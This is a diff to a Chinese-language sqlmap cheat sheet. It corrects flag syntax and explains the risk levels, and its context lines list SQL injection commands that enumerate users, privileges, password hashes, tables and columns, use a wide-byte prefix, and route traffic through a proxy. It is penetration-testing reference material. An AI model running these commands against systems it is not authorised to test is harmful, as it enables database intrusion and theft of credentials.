@@ -26,8 +26,8 @@ sqlmap -u URL --batch   # 不要请求用户输入，使用默认行为
 sqlmap -r aaa.txt   # post型注入
 
 sqlmap -u URL --os "Windows"    # 指定操作系统
-sqlmap -u URL -dbms mysql -level 3  # 指定数据库类型为 mysql，级别为 3（共 5 级，级别越高，检测越全面）
-sqlmap -u URL -dbms mysql -risk 3   # 指定执行测试的风险(1-3, 默认 1)
+sqlmap -u URL --dbms mysql --level 3  # 指定数据库类型为 mysql，级别为 3（共 5 级，级别越高，检测越全面）
+sqlmap -u URL --dbms mysql --risk 3   # 指定执行测试的风险(1-3, 默认 1) 1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试
 sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3   # 宽字节检测
 sqlmap -u URL --proxy "socks5://127.0.0.1:1080" # 代理注入测试
 sqlmap -u URL --referer "http://www.google.com" # 模拟来源
@@ -43,7 +43,6 @@ sqlmap -u URL --is-dba  # 判断当前用户是否是 dba
 sqlmap -u URL --users   # 列出数据库管理系统用户
 sqlmap -u URL --privileges  # 枚举 DBMS 用户权限
 sqlmap -u URL --passwords   # 获取当前数据库密码
-
 
 sqlmap -u URL -D DATABASE --tables  # 获取数据库表
 sqlmap -u URL -D DATABASE -T TABLES --columns   # 获取指定表的列名
